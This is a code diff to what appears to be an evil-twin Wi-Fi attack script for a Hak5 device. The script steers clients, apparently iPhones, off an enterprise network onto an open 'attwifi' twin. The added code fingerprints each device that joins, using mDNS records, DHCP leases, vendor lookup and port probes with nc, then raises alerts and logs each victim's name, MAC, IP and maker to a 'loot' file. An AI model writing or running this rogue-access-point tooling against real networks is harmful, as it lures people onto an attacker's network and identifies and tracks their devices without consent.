@@ -259,12 +259,30 @@ def bss_bssid(iface):
 
 
 def stations(iface):
-    out = hostapd_cli(iface, "all_sta")
+    """Associated station MACs on `iface`.
+
+    Prefer `iw station dump` (reliable on this firmware); `hostapd_cli all_sta`
+    can return empty even when a client is associated. Union both so we never
+    miss a client.
+    """
     macs = []
+    seen = set()
+    out = shell_out(f"iw dev {iface} station dump 2>/dev/null")
+    for line in out.splitlines():
+        line = line.strip()
+        if line.startswith("Station "):
+            m = line.split()[1].lower()
+            if len(m) == 17 and m.count(":") == 5 and m not in seen:
+                seen.add(m)
+                macs.append(m)
+    out = hostapd_cli(iface, "all_sta")
     for line in out.splitlines():
         line = line.strip()
         if len(line) == 17 and line.count(":") == 5:
-            macs.append(line.lower())
+            m = line.lower()
+            if m not in seen:
+                seen.add(m)
+                macs.append(m)
     return macs
 
 
@@ -847,11 +865,188 @@ def start_wispr(args, server_ip, log_fp):
     return w
 
 
+# ---------------------------------------------------------------------------
+# connect-time alert (self-contained; the Pager's native alert bus needs
+# PineAP client tracking, which ATT-Open-Steer intentionally disables so PineAP
+# does not beacon competing `attwifi` BSSIDs. So we detect + alert ourselves.)
+# ---------------------------------------------------------------------------
+# iOS-only Bonjour services. macOS advertises _apple-mobdev2/_companion-link/
+# _asquic too, so ONLY _remotepairing, or an _apple-mobdev2 instance that embeds
+# the client's own MAC, is treated as iPhone/iPad.
+_APPLE_SVCS = {"_companion-link._tcp", "_apple-mobdev2._tcp",
+               "_remotepairing._tcp", "_asquic._udp",
+               "_airplay._tcp", "_raop._tcp"}
+_IPHONE_PORTS = [62078, 49152, 49153, 49154, 49155, 49156, 8770]
+
+
+def lease_field(mac, n):
+    for line in shell_out("cat /tmp/dhcp.leases 2>/dev/null").splitlines():
+        f = line.split()
+        if len(f) >= 4 and f[1].lower() == mac.lower():
+            return f[n - 1]
+    return ""
+
+
+def vendor_for(mac):
+    oui = mac.lower().split(":")[0:3]
+    oui = ":".join(oui)
+    if oui == "00:13:37":
+        return "Hak5"
+    if os.path.exists("/lib/hak5/oui.txt"):
+        for line in shell_out(f"grep -i '^{oui}' /lib/hak5/oui.txt 2>/dev/null").splitlines():
+            parts = line.split("\t")
+            if len(parts) >= 2:
+                return parts[1].strip()
+    return ""
+
+
+def is_random_mac(mac):
+    try:
+        return (int(mac.split(":")[0], 16) & 2) != 0
+    except Exception:
+        return False
+
+
+def port_open(ip, port, timeout=2):
+    if not ip or ip == "-":
+        return False
+    r = subprocess.run(f"timeout 3 nc -z -w{timeout} {ip} {port}",
+                       shell=True, capture_output=True)
+    return r.returncode == 0
+
+
+def mdns_device(ip, maclc):
+    """Return (apple, iphone, name) for the device matching ip/mac via umdns.
+
+    Parses `ubus call umdns browse` for records whose ipv4 == ip, or whose
+    _apple-mobdev2 instance starts with the client MAC. Mirrors the shell
+    alert payload's classifier.
+    """
+    out = shell_out("timeout 4 ubus call umdns browse 2>/dev/null")
+    if not out:
+        return ("no", "no", "")
+    svc = inst = host = ""
+    apple = iphone = False
+    best, bestscore = "", 99
+    rec_mac = rec_ip = False
+    for line in out.splitlines():
+        s = line.strip()
+        if s.startswith('"_') and s.endswith('": {'):
+            svc = s.strip('": {')
+            inst = host = ""
+            rec_mac = rec_ip = False
+        elif s.endswith('": {') and s.startswith('"'):
+            inst = s.rstrip('": {').lstrip('"')
+            host = ""
+            rec_mac = rec_ip = False
+            if svc == "_apple-mobdev2._tcp" and maclc and inst.lower().startswith(maclc):
+                rec_mac = True
+        elif s.startswith('"host"'):
+            host = s.split(':', 1)[1].strip().strip(',').strip('"')
+            if host.endswith(".local"):
+                host = host[:-6]
+        elif s.startswith('"ipv4"'):
+            tip = s.split(':', 1)[1].strip().strip(',').strip('"')
+            if tip == ip:
+                rec_ip = True
+            if not (rec_ip or rec_mac):
+                continue
+            if svc in _APPLE_SVCS:
+                apple = True
+            if svc == "_remotepairing._tcp" or (svc == "_apple-mobdev2._tcp" and rec_mac):
+                iphone = True
+            name, score = "", 4
+            if svc == "_companion-link._tcp":
+                name, score = inst, 1
+            elif svc in ("_airplay._tcp", "_raop._tcp"):
+                name = inst.split("@")[-1]
+                score = 2
+            elif svc == "_apple-mobdev2._tcp":
+                name = inst.split("@")[-1]
+                name = name.split("-supportsRP")[0]
+                score = 3
+            if name in ("", "android", "Android"):
+                name = host or inst
+            if name and name.lower() != "android" and score < bestscore:
+                best, bestscore = name, score
+    return ("yes" if apple else "no", "yes" if iphone else "no", best)
+
+
+def iphone_probe(ip):
+    for p in _IPHONE_PORTS:
+        if port_open(ip, p):
+            return "yes"
+    return "no"
+
+
+def alert_connect(mac, ip, log_fp):
+    """Best-effort identity for a device that just joined `attwifi`, then ALERT."""
+    maclc = mac.lower()
+    if not ip or ip == "-":
+        for _ in range(10):
+            ip = lease_field(mac, 3)
+            if ip:
+                break
+            time.sleep(1)
+    ip = ip or "-"
+
+    apple, iphone, name = mdns_device(ip, maclc)
+    for _ in range(20):
+        if apple == "yes" and name:
+            break
+        time.sleep(1)
+        shell_out("ubus call umdns update >/dev/null 2>&1")
+        apple, iphone, name = mdns_device(ip, maclc)
+
+    dh = lease_field(mac, 4)
+    if dh == "*":
+        dh = ""
+    if not name and dh:
+        name = dh
+    if not name:
+        name = vendor_for(mac)
+
+    man = vendor_for(mac)
+    if man == "Hak5":
+        man = ""
+    if iphone != "yes" and apple != "yes":
+        iphone = iphone_probe(ip)
+    if iphone == "yes":
+        man = man or "iPhone"
+    elif apple == "yes":
+        man = man or "Apple"
+
+    if iphone == "yes" and (not name or name.startswith("fe80") or name.lower() == "android"):
+        name = "iPhone"
+    if not name:
+        name = "Apple device" if apple == "yes" else (
+            "random MAC" if is_random_mac(mac) else "unknown")
+    man = man or "Unknown"
+    maclabel = "MAC(R)" if is_random_mac(mac) else "MAC"
+
+    tag = " (iPhone)" if iphone == "yes" else ""
+    log(f"[alert] {name} {mac} {ip} man={man} iphone={iphone}", log_fp)
+    shell_out(f"LOG green 'attwifi: {name} ({mac})' 2>/dev/null")
+    alert_txt = (f"attwifi connect!{tag}\\n\\n Dev Name: {name}\\n"
+                 f" {maclabel}: {mac}\\n SSID: {AP_OPEN} attwifi (matched)\\n man: {man}")
+    subprocess.run(["ALERT", alert_txt], check=False)
+
+    loot = os.path.join(LOG_DIR, datetime.now().strftime("%Y%m%d-attwifi-connect.log"))
+    try:
+        os.makedirs(LOG_DIR, exist_ok=True)
+        with open(loot, "a") as f:
+            f.write(f"{ts()} | {name} | {mac} | attwifi | {ip} | {man} | iPhone:{iphone}\n")
+    except OSError:
+        pass
+    return name, man, iphone
+
+
 def loop(args, log_fp, radius, wispr):
     log("[loop] waiting for iPhone", log_fp)
     seen_users = []
     steered = {}
     landed = set()
+    alerted = set()
     started = time.time()
     last_status = 0
     last_steer = 0
@@ -885,15 +1080,26 @@ def loop(args, log_fp, radius, wispr):
             if stations(AP_ENT):
                 last_steer = now
 
-        # landed on the open twin
-        for mac in stations(AP_OPEN):
-            if mac in landed:
-                continue
-            landed.add(mac)
+        # devices on the open twin: log a landing once per MAC, but ALERT on
+        # EVERY connect (whenever a MAC newly appears after being absent).
+        present = set(stations(AP_OPEN))
+        for mac in present:
             st = shell_out(f"iw dev {AP_OPEN} station get {mac} 2>/dev/null")
             rssi = next((l.strip() for l in st.splitlines() if "signal:" in l), "")
-            log(f"[landed] {mac} on OPEN {SSID_OPEN!r} {rssi}", log_fp)
-            shell_out(f"LOG green 'landed: {mac}' 2>/dev/null")
+            if mac not in landed:
+                landed.add(mac)
+                log(f"[landed] {mac} on OPEN {SSID_OPEN!r} {rssi}", log_fp)
+                shell_out(f"LOG green 'landed: {mac}' 2>/dev/null")
+            if mac not in alerted:
+                alerted.add(mac)
+                try:
+                    alert_connect(mac, lease_field(mac, 3), log_fp)
+                except Exception as e:
+                    log(f"[alert] error: {e}", log_fp)
+        # forget departed MACs so a reconnect alerts again
+        for mac in list(alerted):
+            if mac not in present:
+                alerted.discard(mac)
 
         if now - last_status > 30:
             last_status = now
